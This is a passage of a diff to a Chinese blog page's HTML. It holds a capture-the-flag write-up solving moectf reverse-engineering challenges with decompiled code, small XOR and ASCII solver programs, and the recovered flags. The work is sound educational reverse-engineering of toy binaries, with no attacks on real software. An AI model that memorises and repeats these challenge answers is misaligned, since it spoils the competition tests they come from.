+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">qqq</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.awt.GridLayout</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.awt.event.ActionEvent</span><span class="p">;</span><span class="w">
@@ -230,10 +462,25 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="cm">/* 和解题无关的处理 */</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div><p>我把源代码精简了一下, 以便看得更清楚点.</p>
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我把源代码精简了一下, 以便看得更清楚点.</p>
 <p>既然是一个GUI程序, 开始运行当然不能找<code>main</code>了.. 注意到题里有个<code>actionPerformed</code>, 好, 就从这个函数开始吧.. 然后在最后面看见了CHECK, 再调转头去看CHECK, 发现是一个检测输入的函数.</p>
 <p>根据<code>if (input &gt; 10000000 &amp;&amp; input &lt; 99999999)</code>知道输入是一个八位数, 接着看<code>if (Math.abs(input / 1000 % 100 - 80) == 3 &amp;&amp; input % 1000 % 927 == 0)</code>知道了中间两位是83或者77 ( 第一次做的时候没看见abs函数,浪费了n久最后发现差点气得摔键盘 ) 最后3位是927.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">v5</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">v5</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">input</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">v7</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">10</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">v8</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">10</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">v3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w">
@@ -241,22 +488,49 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">v7</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="n">10</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">v8</span><span class="w"> </span><span class="o">/=</span><span class="w"> </span><span class="n">10</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">v5</span><span class="o">++</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div><p>这个循环是用来判断回文数字的, 我们已经知道了八位数的后五位是77927, 对称过去就是72977927.</p>
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个循环是用来判断回文数字的, 我们已经知道了八位数的后五位是77927, 对称过去就是72977927.</p>
 <p>然后回到<code>actionPerformed</code>函数, 发现这么几句:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">CHECK</span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">a</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">CHECK</span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">a</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">tx</span><span class="p">.</span><span class="na">setText</span><span class="p">(</span><span class="s">&#34;moectf{&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">a</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">1000000</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">a</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">10000</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">100</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">a</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">100</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">100</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;_he}&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div><p>这个提取出来了72977927的前六位72, 97, 79并用ASCII解码, 然后把字符串拼起来..</p>
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个提取出来了72977927的前六位72, 97, 79并用ASCII解码, 然后把字符串拼起来..</p>
 <p>出于懒, 写一小程序, 解之:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl"> <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">72</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">97</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">79</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;moectf{&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="n">c</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;_he}&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>咖啡真好喝~</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>咖啡真好喝~</p>
 <h3 class="heading-element" id="mine-sweep"><span>Mine Sweep</span>
  <a href="#mine-sweep" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -268,7 +542,28 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
  </a>
 </h3><p>有了对上面的Easy的体验我丝毫不敢觉得这题狠easy&hellip;果不其然, 扔进<code>IDA</code>之后我一脸蒙圈, 这是个什么玩意儿啊&hellip;</p>
 <p>不管了, 找到了<code>main</code>, 然后F5, 得到以下东东:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"> <span class="cm">/* 变量声明 */</span>
 </span></span><span class="line"><span class="cl"> <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
@@ -284,25 +579,83 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="nf">sub_401270</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"> <span class="nf">sub_4012A0</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>啊嘞? 这画风怎么这么奇怪? 我看了眼题目描述, 得, <code>AntiAntiDebug</code>我一准儿是不会了, 那就解码吧&hellip;</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>啊嘞? 这画风怎么这么奇怪? 我看了眼题目描述, 得, <code>AntiAntiDebug</code>我一准儿是不会了, 那就解码吧&hellip;</p>
 <p>顺着函数找了好久</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_401270</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_401270</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"> <span class="o">*</span><span class="n">a1</span> <span class="o">=</span> <span class="mi">109</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="nf">sub_401240</span><span class="p">(</span><span class="n">byte_404080</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">5LL</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">sub_4012A0</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">sub_4012A0</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_40409F</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>这是<code>main</code>里面提到的两个函数, 分别看了下, 一个指向<code>byte_404080</code>, 一个指向<code>byte_40409F</code></p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这是<code>main</code>里面提到的两个函数, 分别看了下, 一个指向<code>byte_404080</code>, 一个指向<code>byte_40409F</code></p>
 <p>本以为是那些常用的编码的decode, 结果发现根本没有这些字串&hellip;于是, 我想到了<code>Moe RE</code>&hellip;</p>
 <p>先找到了<code>byte_404080</code>, 在长下面这样:</p>
-<pre tabindex="0"><code class="language-assembly" data-lang="assembly">.data:404080 byte_404080 db 74h, 22h, 28h, 2Eh, 39h, 2Bh, 36h, 3Ah, 7Dh, 3Ah, 12h
-.data:404080 ; DATA XREF: sub_401270+8↑o
-.data:404080 ; sub_401360+96↑r ...
-.data:404080 db 3Eh, 39h, 3Fh, 12h, 9, 79h, 2Eh, 7Dh, 29h, 7Eh, 12h
-.data:404080 db 7Ch, 3Eh, 12h, 28h, 79h, 3Eh, 34h, 30h, 4Dh</code></pre><p>按照<code>MoeRE</code>的思想, 我想着找个数来挨个异或一下试试..然后写了个小程序:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.data:404080 byte_404080 db 74h, 22h, 28h, 2Eh, 39h, 2Bh, 36h, 3Ah, 7Dh, 3Ah, 12h
+</span></span><span class="line"><span class="cl">.data:404080 ; DATA XREF: sub_401270+8↑o
+</span></span><span class="line"><span class="cl">.data:404080 ; sub_401360+96↑r ...
+</span></span><span class="line"><span class="cl">.data:404080 db 3Eh, 39h, 3Fh, 12h, 9, 79h, 2Eh, 7Dh, 29h, 7Eh, 12h
+</span></span><span class="line"><span class="cl">.data:404080 db 7Ch, 3Eh, 12h, 28h, 79h, 3Eh, 34h, 30h, 4Dh</span></span></code></pre></td></tr></table>
+</div>
+</div><p>按照<code>MoeRE</code>的思想, 我想着找个数来挨个异或一下试试..然后写了个小程序:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
@@ -320,7 +673,9 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"> <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">b</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>第一次试的时候, <code>key</code>用的是 <code>a1</code> 的 <code>109</code> , 然后发现不对&hellip;? 后来看了一眼<code>main</code>里面的<code>v4~v9</code>, 感觉太大的数怎么也不可能当<code>key</code>, 就拿<code>77</code>试了试&hellip; 然后运行了下<code>flag</code>就出来了&hellip;?</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一次试的时候, <code>key</code>用的是 <code>a1</code> 的 <code>109</code> , 然后发现不对&hellip;? 后来看了一眼<code>main</code>里面的<code>v4~v9</code>, 感觉太大的数怎么也不可能当<code>key</code>, 就拿<code>77</code>试了试&hellip; 然后运行了下<code>flag</code>就出来了&hellip;?</p>
 <h3 class="heading-element" id="algorithm-task"><span>Algorithm Task</span>
  <a href="#algorithm-task" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -328,7 +683,52 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </h3><p>这道题一看文件名叫hard就知道肯定不简单&hellip;</p>
 <p>扔进<code>IDA</code>, 然后看到了一副宏伟壮观的程序跳转画面……</p>
 <p>果断找到<code>main</code>函数按F5, 然后看见了<code>Decompiling</code>窗口卡了半天, 最后出来了下面的代码:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"> <span class="cm">/* 200多个变量声明 */</span>
 </span></span><span class="line"><span class="cl"> <span class="n">v186</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
@@ -368,7 +768,9 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"> <span class="nf">getchar</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>在源代码中看见了<code>dcba3261b6ef0d77</code>和<code>X1I0X0YxYWdfWTB1XzRyZV9TdHIwbmd9</code>两串可疑的东东, 前面那串要么是<code>MD5</code>要么是<code>SHA1</code>, 后面那串肯定是<code>Base</code>系列的, 根据题目给的信息, 本题仅用了两种常见算法, 基本可以确定把俩解出来的字符串拼起来前面加上<code>moectf{</code>就OK了.</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在源代码中看见了<code>dcba3261b6ef0d77</code>和<code>X1I0X0YxYWdfWTB1XzRyZV9TdHIwbmd9</code>两串可疑的东东, 前面那串要么是<code>MD5</code>要么是<code>SHA1</code>, 后面那串肯定是<code>Base</code>系列的, 根据题目给的信息, 本题仅用了两种常见算法, 基本可以确定把俩解出来的字符串拼起来前面加上<code>moectf{</code>就OK了.</p>
 <p>在网上找个工具成功解出<code>flag</code>: <code>moectf{enj0y_R4_F1ag_Y0u_4re_Str0ng}</code></p>
 <h3 class="heading-element" id="easy-c"><span>Easy C++</span>
  <a href="#easy-c" class="heading-mark">
@@ -386,7 +788,21 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>读了下题目给的代码, 大概懂了意思之后, 写了一段小程序, 读取文件, 然后把数字提取出来:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
